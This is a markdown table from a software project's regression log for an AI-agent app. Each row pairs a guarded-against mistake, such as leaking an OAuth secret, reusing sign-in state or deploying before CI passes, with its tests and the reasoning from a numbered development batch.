| **A `.dockerignore` that is a denylist, lets in a file the bundle did not write, or lets in the Dockerfile, itself, the README or `.gitattributes`** | `test_the_dockerignore_lets_in_exactly_the_bundles_files`, `test_modelscope_gets_an_image_and_no_requirements_file`, and the `integration` test `test_the_image_holds_exactly_the_bundles_files` | Batch 166 (HD9). ModelScope builds from a git clone of the Studio, so the context carries `.git` and whatever else is there. The integration test plants `.git`, `providers.json`, a stray file and a cache and compares the real image's files to the bundle's |
| **Escaping a path in the `.dockerignore` instead of refusing it** | `test_a_path_it_cannot_name_literally_is_refused` (eight names) | Batch 166 (HD9). A pattern character in a let-in line would let in more than the one file, or nothing; no file in the repository needs one |
| **Running uv from anywhere but the lock's input folder** | `test_the_lock_records_no_path_of_the_machine_that_built_it` | Batch 166 (HD9). uv writes the input's path, relative to where it runs, into its `# via -r` notes; bridge.lock is compiled from a temporary file, so it would carry a path of the build machine |
| **Installing the bridge in the image without hashes, from source, or building the session environment at container start on ModelScope** | `TestTheModelScopeImage` | Batch 166 (HD2). The image is ours, so the bridge gets the hash-pinned, wheels-only install the sessions already had, and a container start installs nothing |
| **Turning Gradio's analytics on, or setting the variable instead of defaulting it** | `test_the_shim_turns_gradio_analytics_off_before_anything_loads` | Batch 166 (HD9). Every start called huggingface.co and api.gradio.app with them on (measured); `setdefault` leaves the operator the choice |
| **Taking a pasted key in a shared deployment, or refusing one without naming where a key can go** | `test_a_pasted_key_is_refused`, `test_without_a_hugging_face_app_only_openrouter_is_offered`, `TestTheRoutes::test_end_to_end`, `test_a_private_deployment_says_its_keys_go_here` | Batch 166 (HD12). A decision with its reasons in §79, not a gap: the refusal, the listing and the landing page name the installed harness and a private single-user duplicate |
| **Delivering ModelScope's token to the session that started the sign-in without the person pasting a code** | `test_another_session_cannot_redeem_it`, `test_another_sessions_handle_is_refused`, `test_end_to_end_over_a_real_session` | Batch 167 (HD13). The owner's choice: with automatic delivery anyone could start a sign-in, send its link to someone else and receive that person's token when they approved; a handle only the starting session can redeem leaves the approver nowhere to paste it |
| **Reusing a sign-in's state, letting it outlive ten minutes, or repeating anything the callback was sent** | `test_a_state_is_spent_by_its_first_use`, `test_an_expired_state_is_refused`, `test_a_state_this_bridge_never_issued_is_refused`, `test_a_forged_state_is_refused_without_repeating_it` | Batch 167 (HD13). A redirect is usable once; the page reflects nothing, so the code and state stay where they arrived |
| **Trusting the token endpoint's status over its body, or accepting a token without `api-inference`** | `test_an_error_in_a_200_is_still_a_refusal`, `test_a_token_without_inference_is_refused` | Batch 167 (HD13). ModelScope has been measured answering failures with HTTP 200; a token that cannot call inference would fail on the first turn, far from the sign-in that made it |
| **Leaving the ModelScope app's secret in the bridge's environment, reading it from there in `from_env`, or not making the bridge non-dumpable** | `test_main_takes_them_first_and_hands_them_to_the_bridge`, `test_taking_them_removes_every_one`, `test_the_secret_is_never_read_from_the_environment_here` | Batch 167 (HD6, HD13). Every child the bridge starts would inherit it, and a session runs as the same user as the bridge |
| **Passing the ModelScope secret, or anything but the offer's name, into a session's environment** | `test_it_carries_nothing_of_the_deployments`, `test_it_runs_the_hosted_driver_and_names_only_the_offer` | Batch 167 (HD3, HD13). The session learns which sign-in its bridge completes, never what the bridge needs to complete it |
| **Honouring `VENASTINE_BRIDGE_SIGN_IN` outside a hosted session, or from a `.env`** | `test_only_a_hosted_session_takes_it_and_only_known_names`, `TestTheBridgeOffersASignIn::test_a_dotenv_cannot_set_it` | Batch 167 (HD13, A70). A local install has no bridge to finish the sign-in, so offering it there is a dead end |
| **Accepting a bridge answer for a request the session is not waiting on** | `test_the_bridge_signs_in_and_the_token_stays_in_memory` | Batch 167 (HD13). Only the bridge can send one today; the app does not lean on that alone |
| **Offering ModelScope as a sign-in in a local install, or as only a sign-in** | `test_a_local_install_connects_modelscope_with_a_key`, `test_only_the_permitted_providers_sign_in` | Batch 167 (HD5, HD13). Its token endpoint takes only a confidential client, so where no bridge holds the secret it stays the pasted key it always was |
| **Forbidding every frame on the sign-in callback page, or letting any site but the platform's own frame it** | `test_only_the_platforms_own_site_may_frame_it` | Batch 167 (HD13), measured live: ModelScope shows the redirect to a Studio's host inside www.modelscope.ai's Studio page, so `frame-ancestors 'none'` hid the handle from the person it was for |
| **Setting `supports_stream_usage` on a preset nobody measured, or clearing it on ModelScope's** | `test_only_measured_presets_promise_streaming_usage` | Batch 167 (D21). The flag promises a stream ends with usage and a broken promise fails every turn; ModelScope keeps it on four models measured, and without it most send zeros, which hid the meter on the live demo |
| **Letting a shared deployment run `/secrets`** | `test_secrets_is_refused`, `TestTheSingleUserTui::test_secrets_works_here` | Batch 168 (HD4, HD12). Its SSH and sudo passwords serve only the shell tools a shared deployment refuses, and a password typed into a shared server is what HD12 refuses for keys; a private deployment keeps it |
| **A hosted header or session banner naming config.yaml's pair before anything is connected** | `test_the_header_says_what_to_type_until_a_model_is_connected`, `test_the_header_names_the_configured_pair` | Batch 168. A shared session holds no key for that pair; the header says what to type until the pair in use is connected, and a local install still names it |
| **An idle hosted session that keeps drawing** | `TestAnIdleHostedSessionDrawsNothing` | Batch 168 (HD8). The bridge counts a session's output as activity, so a blinking raven or cursor kept an abandoned tab alive for the full lifetime (6.9 KB/s and 0.6 KB/s, measured); a token stream's pause must survive a change of state, and a local install keeps both blinks |
| **Announcing the user mcp.json in a shared deployment** | `test_a_shared_deployment_creates_it_without_a_word` | Batch 168. The file is in a session directory deleted with the tab and nothing there can edit it; a private deployment still says where it is |
| **Sweeping anything but a killed bridge's session directories, or sweeping from build_bridge** | `TestStaleSessionsAreSwept`, `test_main_takes_them_first_and_hands_them_to_the_bridge` | Batch 168 (HD8). Directories with the session prefix only -- never a link, another user's, or the single-user state -- and only from app.py's main(), before the server listens: the suite builds bridges in parallel over one temporary directory |
| **Naming `/connect modelscope` on a landing page whose bridge cannot complete it** | `test_the_landing_page_names_each_modelscope_site_where_it_signs_in` | Batch 168 (HD13). A duplicated Space copies variables but not the secret, so there the command could only refuse |
| **Deploying a commit before every CI check on it has passed** | `TestTheVerdict`, `TestTheTrigger`, `test_the_deploy_waits_for_every_workflow_a_push_to_main_runs` | Batch 169 (HD9, amended), the owner's rule. Every check run counts -- a job its workflow lets fail and a scheduled run on the same commit included -- except the deploy's own and GitHub's `dynamic` runs; the workflow_run list must be exactly the workflows a push to main runs, or a commit whose last workflow is missing from it never deploys |
| **Trusting `github.ref` or an environment's branch rule to say a workflow_run came from a push to main** | `test_only_a_push_to_main_from_this_repository_is_judged`, `test_the_gate_judges_only_a_push_to_main_from_this_repository` | Batch 169 (HD9). A workflow_run job's github.ref is always the default branch, and a fork's pull request from a branch it named main matches `branches: [main]`; the event, branch and head repository are checked by the job's `if:` and by the script |
| **A secret readable by any job but the deploy's, or before the gate** | `test_only_the_deploy_job_holds_a_secret_and_only_after_the_gate`, `test_no_expression_is_pasted_into_a_shell_line`, `test_the_workflow_never_deploys_unverified` | Batch 169 (HD9). The gate job holds nothing; `deploy-hf` alone enters environment `demo`, only on the gate's deploy verdict; event values reach scripts through `env:` |
| **Sending a bundle that was not scanned, audited and gated first** | `test_scan_and_audit_then_the_gate_then_the_send`, `test_no_gitleaks_refuses_before_anything_is_built`, `test_a_finding_refuses` | Batch 169 (HD9). gitleaks runs from the bundle's root, pip-audit over the locks it installs, the gate is asked once more, and only then is anything sent; a missing secret or target is a dry run |
| **Accepting an audit finding by anything but its ID, or after its version moves** | `test_an_accepted_id_is_passed_only_where_its_version_is_pinned`, `test_an_entry_no_lock_pins_any_more_is_stale_and_says_so`, `test_a_pin_is_matched_exactly` | Batch 169, the owner's call on pillow 12.3.0 under Gradio 6.30.0's `pillow<13`. A new ID for the same version still refuses |
| **A deploy that overwrites the Space's single-user switch, forces a ModelScope push, or prints a token** | `test_a_single_user_value_already_there_is_never_touched`, `test_the_push_is_never_forced`, `test_the_token_is_in_neither_a_url_nor_an_argument`, `test_a_refusal_exits_non_zero_with_the_token_redacted` | Batch 169 (HD7, HD9). The switch is declared empty for duplicates and never changed; ModelScope forbids a forced push; the git token rides in a header set through GIT_CONFIG_* |
| **A schedule sharing a cancelling concurrency group with a push run** | `test_a_schedule_cannot_cancel_a_push_run_the_gate_waits_for` | Batch 169. Keyed on the ref alone, codeql's and pip-audit's Monday runs could cancel a push run on main, and a cancelled push run is a failed check to the gate |
| **Moving one copyright line without the other, a year backwards, or a CR into the holder** | `TestTheRewrite`, `test_license_and_notice_carry_the_same_copyright`, `test_the_copyright_job_is_the_only_workflow_that_writes` | Batch 169 (section 80, LY1-LY3). Both files or neither; LICENSE is CRLF in a Windows worktree and NOTICE LF, and the first run against the real files read the CR into LICENSE's holder |
| **A bridge that does not log which build it serves** | `test_main_takes_them_first_and_hands_them_to_the_bridge` | Batch 169. A private Studio answers an anonymous request with 403, so `serving build <sha>` in its log is how deploy_demo.py confirms a ModelScope deploy |
| **Deploying while a high or critical code scanning alert is open on main, or reading an unreadable alert list as empty** | `test_an_open_high_or_critical_code_scanning_alert_refuses`, `test_alerts_that_cannot_be_read_stop_the_deploy`, `test_only_the_deploy_job_holds_a_secret_and_only_after_the_gate` | Batch 170 (HD9), the owner's choice. CodeQL on a push uploads its alerts and fails nothing, so this is the only check that sees them; both jobs that run the gate need `security-events: read`, and medium, low and quality alerts are triaged rather than gated |
| **Writing the MCP consent store with the umask's mode** | `test_a_consent_is_writable_by_this_user_alone` | Batch 170. It decides whether a server starts without asking, like the trust store beside it, and a group-writable umask let someone else write a consent; it is 0o600 now |
| **Putting an image's bytes in a tool's result dict** | `test_dispatch_attaches_and_the_result_carries_no_payload`, `test_a_call_attaches_to_the_turns_memory_under_its_own_id` | Batch 171 (ROADMAP_v3 §81, IM3). A result passes `check_output_policy`, which runs the secret patterns over every string value, so base64 there can be altered, and an altered image is a request the provider rejects. It would also reach the `tool_result` event and both transcripts. The bytes go to `memory.attach_image` and the result is one sentence. Both tests drive the REAL `dispatch`, because a test that calls the handler alone cannot see what the redactor would have done to the result |
| **Turning `content` into a list of blocks to carry an image** | `test_an_attached_image_survives_a_write_and_a_read` (asserts the row's `content` is the plain string), every reconstruction test in `test_image_input.py` | Batch 171 (IM2). About thirty-five sites in sixteen modules read a message's `content` as a string: replay, the transcript, `/copy`, the compactor, the summarizer. The image is a nullable `MessageLog.images` column, present in the neutral shape only when a row attached one, and the fake mirrors that (`test_fake_storage_mirror.py`'s image row) |
| **Sending an OpenAI-compatible image inside a tool message, or between two of them** | `test_one_harness_message_after_every_tool_message`, `test_two_results_with_images_share_one_message` | Batch 171 (IM4). openai 2.45.0 types a tool message's content as text parts only, so an image goes in a user message. Every tool message has to follow the assistant turn directly, so that message goes after the WHOLE batch. Flushing it per tool message is the mutation the first test kills |
| **Offering `view_image` without asking whether the image can arrive** | `test_it_is_offered_only_where_an_image_can_arrive`, `test_a_run_that_cannot_deliver_is_not` | Batch 171 (IM6). `schemas(images=)` defaults False, so a caller that does not pass it hides the tool. The loop test drives `_run` with the real registry and fails if `RunInfo.images` stops reaching the schema list, or stops reading the thread's kind. A research pass is never offered the tool |
| **Treating a truthy `accepts_images` as opted in** | `test_only_a_json_true_opts_in` | Batch 171 (IM4, A29's reason). `"true"` and `1` are refused: `bool("false")` is True, and a quoted flag is one hand edit away |
| **Sizing an image by its base64 length in the compactor** | `test_a_message_counts_its_images_and_not_their_length`, `test_an_archive_row_counts_its_stored_images` | Batch 171 (IM8). A 1 MB file is about 1.3 million characters, which the proxy reads as 330,000 tokens, so the thread would fold at once. Every row-size sum goes through `_row_chars`, so a floor and the pin cap cannot disagree about what an image costs |
| **Replaying a Gemini function call without the thought signature it came with** | `test_each_call_gets_its_own_signature_and_nothing_is_added`, `test_signed_and_unsigned_calls_are_both_recorded`, `test_a_GOOGLE_thought_signature_survives_the_REAL_types_both_ways` | Batch 172 (ROADMAP_v3 §82, GS2). Every model a new Google account can call is Gemini 3, which answers 400 when a call in the current turn comes back unsigned. google-genai 1.0.0 had no field for the signature, so every GOOGLE tool loop failed on its second request |
| **Recording only the calls that carried a signature** | `test_a_model_that_signed_nothing_gets_nothing` | Batch 172 (GS2). Gemini 3 signs only the first call of a parallel batch, and a model that does not think signs nothing. Without the null block, "this model attached nothing" reads as "nothing is known" and earns the placeholder |
| **Sending a turn another model wrote with no signature, or with that model's** | `test_on_the_first_call_only`, `test_each_assistant_turn_is_judged_on_its_own`, `test_an_unreadable_signature_costs_that_call_alone` | Batch 172 (GS3). A signature goes back only to the model that produced it, §44's pair. A turn from another provider or model, a row from before this batch, or a value that will not decode gets Google's placeholder on its first call, measured accepted |
| **Treating every field on the SDK's `Schema` as one the Gemini API takes** | `test_every_VERIFIED_schema_key_is_still_a_field_on_the_pinned_type`, `test_the_google_reduction_keeps_the_shape_it_is_allowed_to_keep`, `test_tools_google_wraps_in_function_declarations` | Batch 172 (GS4). google-genai 2.29.0's `additional_properties` is a Vertex AI field the Gemini API refuses (400, `Unknown name`), and one refused key fails every declaration at once |
| **Asserting `thinking_budget` is absent from the google-genai pin** | `test_the_thinking_budget_guard_still_describes_the_pin` | Batch 172 (GS1). Inverted, as its own message asked: the pin moved to 2.29.0, which carries the field, so Google reasoning effort is on. Red now means the field went away and effort turned off |
| **Putting a tool's image inside a Gemini function response, or before the batch ends** | `test_one_harness_turn_after_every_function_response`, `test_the_turn_lands_before_the_next_turn`, `test_a_GOOGLE_image_turn_builds_from_the_REAL_types` | Batch 173 (ROADMAP_v3 §81, IM9). Gemini 2.5 refuses images in a function response and only Gemini 3 takes `FunctionResponse.parts`; one harness turn after the whole batch works on both, measured, and is the shape Google's ADK uses |
| **Handing `Blob.data` the base64 text** | `test_one_harness_turn_after_every_function_response`, `test_jpeg_and_webp_are_sent` | Batch 173 (IM9). `Blob.data` is bytes; the base64 string would be sent as the picture of a string. A copy that will not decode costs that image a note, never the request (`test_an_unreadable_copy_costs_that_image_alone`) |
| **Sending a GIF to Google** | `test_a_gif_is_a_note_and_the_png_beside_it_still_goes`, `test_a_gif_alone_adds_no_turn` | Batch 173 (IM10), the owner's choice. Gemini does not document GIF, though two Gemini 3 models read one; an image the endpoint refused would stay in the thread and fail every request after it |
| **Refusing or warning about `accepts_images` on GOOGLE** | `test_google_is_opted_in_like_any_other`, `test_call_model_stream_delivers_to_a_flagged_google` | Batch 173 (IM9). The flag is honoured on the same strict `is True` test as every other provider; the once-only warning is gone with the deferral |
| **A file tool a shared deployment would run** | `test_every_tool_that_takes_the_file_approval_check_is_refused`, `test_each_is_refused_when_shared[view_image]` | Batch 174 (ROADMAP_v3 §79, HD4 amended). `view_image` reads a workspace file under `read`'s rules and arrived by merge without joining `SHARED_REFUSED_TOOLS`; in one container shared by every visitor, a tool that reads the container's files reads other sessions' too. The set is now tied to the file approval check rather than to a list of names |
| **Folding a later triage into an earlier entry, or accepting an ID twice** | `test_no_id_is_accepted_twice`, `test_every_entry_for_a_pinned_version_is_passed` | Batch 175 (HD9). `deploy_demo.ACCEPTED` holds one entry per triage, so each reason says what was read and when; pillow 12.3.0 now has two. Both must reach pip-audit, and an ID in two entries would survive the removal of one |
| **Giving one ModelScope site's sign-in another's endpoint, secret, callback or client id variable** | `TestTwoSites`, `test_each_site_is_answered_on_its_own_path_alone`, `TestWhatTheBridgeOffers` | Batch 176 (HD13 amended). modelscope.ai and modelscope.cn are separate issuers with separate accounts and apps; a code traded at the other site's token endpoint, or with the other app's secret, could only fail, and one shared callback would have handed a site's code to the other's flows |
| **Sending a session's code anywhere but the site it last started, or leaving the other site's flow open** | `test_a_cn_sign_in_goes_to_modelscope_cn_alone`, `test_starting_one_site_drops_the_others_flow`, `test_cancel_and_stop_both_drop_the_flow`, `test_a_code_with_nothing_started_is_refused` | Batch 176 (HD13). A session waits for one sign-in at a time; a flow left open on the other site could still be approved after the person moved on |
| **A bridge sign-in the session layer does not know, or a sign-in with no revoke page** | `test_the_names_it_knows_are_the_bridges_sites`, `test_every_sign_in_has_a_revoke_page` | Batch 176. security/hosted.py does not import deploy/, so its names are a copy held to the bridge's SITES here; a missing revoke page is a KeyError in the banner the moment a deployment offers that sign-in |
| **A Studio signing in through the hand-registered app while its own is injected, or its own app standing in for a site it is not** | `TestTheStudiosOwnApp`, `test_a_studio_with_oauth_on_signs_in_through_its_own_app`, `test_a_studios_own_app_is_answered_on_its_own_path` | Batch 177 (HD13 amended), the owner's choice of ModelScope's Studio OAuth. The app is the issuer's site's, asks for openid and api-inference alone, returns to /auth/callback, and leaves modelscope.cn and a Hugging Face Space on the hand-registered apps |
| **Fixed endpoints, or a discovery document taken on trust** | `TestDiscovery`, `test_the_flow_goes_where_the_document_says`, `test_a_document_naming_another_issuer_is_not_offered` | Batch 177, the owner's choice. Both endpoints https on the issuer's host, the token endpoint taking client_secret_post, and the issuer the site's own; a document that fails any of it offers nothing, with the reason logged |
| **Leaving the Studio's OAUTH_CLIENT_SECRET in the environment, or SYSTEM=spaces on a Studio** | `test_taking_them_removes_every_one`, `test_a_studio_drops_the_spaces_flag_and_a_space_keeps_it`, `test_main_takes_them_first_and_hands_them_to_the_bridge` | Batch 177 (HD6, HD13). Every child the bridge starts would inherit the secret; SYSTEM=spaces makes Gradio 6.30 start Hugging Face's reload watcher on a Studio, and a Space keeps its own |
| **Reading a discovery document with the scheme its provider names** | `test_it_is_always_read_over_https`, `test_a_provider_that_is_no_web_address_is_refused`, `test_it_signs_in_through_the_injected_app`, `test_a_studio_with_oauth_on_signs_in_through_its_own_app` | Batch 178 (HD13). The Studio injects `OPENID_PROVIDER_URL` as plain http, measured live; a document read in the clear could be rewritten on the way, so it is read over https whatever the scheme |
| **A modal screen with no row in `_modal_cases()`, or with no `align` rule** | `test_the_table_has_a_row_for_every_modal_screen`, `test_every_modal_is_centred_bounded_and_styled[secret]`, `test_every_modal_keeps_its_decision_on_screen[*-secret-sign-in]` | Batch 179 (#112). SecretScreen had neither, so every masked prompt -- an API key, the secrets store's passphrase, the hosted sign-in's code -- opened in the top-left corner; the row above said a tenth screen would go red, and nothing made it. The table now answers to every ModalScreen subclass in a `tui` module, and a walk that finds none fails too |
| **Offering the ChatGPT plan on a hosted deployment, or taking a key for it** | `test_a_hosted_deployment_refuses_it[shared]`, `test_a_hosted_deployment_refuses_it[single-user]`, `test_key_is_refused_because_the_plan_has_none` | Batch 184 (§83 CG1). OpenAI offers plan usage to apps on the person's own machine and its redirect reaches only 127.0.0.1; the plan has no key to paste |
| **Trusting an ID token's own algorithm, or skipping its audience, issuer, expiry or nonce** | `TestTheIdToken` | Batch 184 (CG6). RS256 is pinned BEFORE a key is chosen, so an HMAC token is never checked against the public key used as a secret, and `none` is refused outright |
| **Refreshing outside the lock, reading the file before taking it, or returning a rotated token before it is written** | `test_a_refresh_waits_for_another_process_and_uses_its_token`, `test_a_due_token_is_refreshed_and_written_before_it_is_returned` | Batch 184 (CG4). A refresh spends the refresh token it replaces; two processes refreshing at once would each spend the same one |
| **Deleting the tokens on a passing failure, or keeping them after an unusable refresh** | `test_a_passing_failure_keeps_every_token`, `test_an_unusable_refresh_token_ends_the_session` | Batch 184 (CG10). A network failure, a 5xx or an unlisted code keeps every token; only OpenAI's unusable-refresh codes end the session |
| **A callback from another ChatGPT account accepted** | `test_another_accounts_client_id_is_refused` | Batch 184 (CG12, the owner's choice). One account per install; `/disconnect chatgpt --forget` is how it changes |
| **`/disconnect` deleting a provider's entry, writing the file for a session key, or acting without asking** | `TestForgettingAKey`, `test_a_key_is_blanked_after_a_yes_and_kept_after_a_no`, `test_a_session_key_goes_and_the_file_is_never_written` | Batch 184 (CG13, CG14, the owner's choices). The key is blanked and every other field stays for a later `/connect` |
| **`/model CHATGPT` switching while the plan is signed out** | `test_model_chatgpt_while_signed_out_says_how_to_sign_in` | Batch 184 (CG11), changed on purpose in batch 188: slice 2b lifted CG11's refusal, and the switch now refuses only while signed out, where it would fail the next turn rather than the command |
| **The sign-in listener logging its request line** | `test_the_request_line_is_never_logged` | Batch 184. `BaseHTTPRequestHandler` writes every request line to stderr, and this one carries the authorization code |
| **The sign-in roster or the streaming-usage set without chatgpt** | `test_only_the_permitted_providers_sign_in`, `test_only_measured_presets_promise_streaming_usage` | Batch 184, changed on purpose: the plan passes HD5's test for local installs, and slice 0 measured usage on every completed stream |
| **A ChatGPT sign-out that does not say what happened to the registration** | `test_the_plan_is_signed_out_and_its_registration_kept`, `test_forget_drops_the_registration_too` | Batch 185 (CG12 amended). The owner's live check could not tell plain `/disconnect chatgpt` from `--forget`; the difference shows only at the next sign-in, so both forms say it, before and after, from `_registration_clause` |
| **A ChatGPT usage limit retried, or written without leading with Manage usage** | `test_a_usage_limit_leads_with_manage_usage_and_is_never_retried`, `test_a_usage_limit_on_the_REAL_sdk_is_never_retried`, `test_a_usage_limit_leads_with_manage_usage` | Batch 188 (CG8, CG10). The loop retries a generic 429; this one spends nothing to wait for, so its own type keeps it out of `core/provider_errors.py`'s reach |
| **Plan reasoning handed to a model that did not write it, or withheld from a turn that ended in calls** | `test_reasoning_another_model_wrote_is_dropped`, `test_a_turn_that_ended_in_calls_hands_its_reasoning_back_too` | Batch 188 (CG18, CG23) |
| **`ultra` or `none` offered on the plan** | `test_the_lists_levels_minus_ultra_and_none`, `test_a_failed_read_falls_back_without_ultra_and_is_not_trusted` | Batch 188 (CG22, CG24). The list names `ultra` and the route refuses it; the static table's default ends in it too |
| **The plan's token sent anywhere but api.openai.com, or the SDK left to retry** | `test_it_is_built_with_a_key_function_and_no_sdk_retries`, `test_a_plan_refusal_carries_what_the_mapping_reads` | Batch 188 (CG21) |
| **A plan event dispatched by its class** | `test_dispatch_is_on_the_type_alone`, `test_an_unknown_plan_event_keeps_its_type_whatever_class_it_is_given` | Batch 188. Slice 2a measured `response.metadata` parsed as a `ResponseAudioDeltaEvent` |
| **A signed-in ChatGPT plan warned about as a missing API_KEY** | `test_a_signed_in_plan_has_nothing_missing`, `test_launching_on_the_plan_warns_of_no_missing_key`, `test_critic_on_the_plan_warns_of_no_missing_key`, `test_signing_in_writes_the_keyless_entry_and_model_switches` | Batch 189, the owner's live check: launch, `/model` and `/critic` each tested the key, and the plan's entry has none by design (CG20) |
| **An unlisted plan model given the static table's advice** | `test_an_unlisted_model_is_named_against_the_plans_list` | Batch 189, the owner's live check: a typo got "add an entry to config.MODEL_EFFORT_LEVELS" and a level the filter removes |
| **A null `last_n` or `scope` refused, or an empty scope coerced** | `test_an_explicit_null_is_the_declared_default`, `test_an_explicit_null_scope_is_the_declared_default`, `test_an_empty_scope_is_still_refused_rather_than_coerced` | Batch 190 (ROADMAP_v3 §83): the ChatGPT plan's model sends optional parameters at their declared defaults; only null means absent |
| **A rate book that never forgets an address, forgets a live one, or sweeps on every request** | `test_an_address_past_the_window_is_forgotten`, `test_a_live_limit_survives_the_sweep`, `test_the_sweep_runs_once_a_window_not_on_every_request`, `test_an_address_never_allowed_is_forgotten_too`, `test_both_of_the_bridges_limits_are_such_books` | Batch 191 (ROADMAP_v3 §79, HD8), from the pre-public security review: both books gained an entry per address forever, which a sender with many addresses could grow until the container restarted |
